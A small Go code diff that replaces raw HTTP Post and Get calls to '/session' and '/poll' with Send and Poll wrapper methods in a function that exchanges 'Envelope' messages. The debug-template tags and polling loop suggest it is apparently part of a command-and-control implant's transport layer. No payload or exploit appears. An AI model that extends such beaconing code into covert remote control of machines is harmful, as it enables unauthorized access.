@@ -259,7 +259,7 @@ func httpConnect() (*Connection, error) {
 			// {{if .Debug}}
 			log.Printf("[http] send envelope ...")
 			// {{end}}
-			go client.Post("/session", data)
+			go client.Send(data)
 		}
 	}()
 
@@ -270,7 +270,7 @@ func httpConnect() (*Connection, error) {
 			case <-ctrl:
 				return
 			default:
-				resp, err := client.Get("/poll")
+				resp, err := client.Poll()
 				switch err := err.(type) {
 				case nil:
 					envelope := &pb.Envelope{}
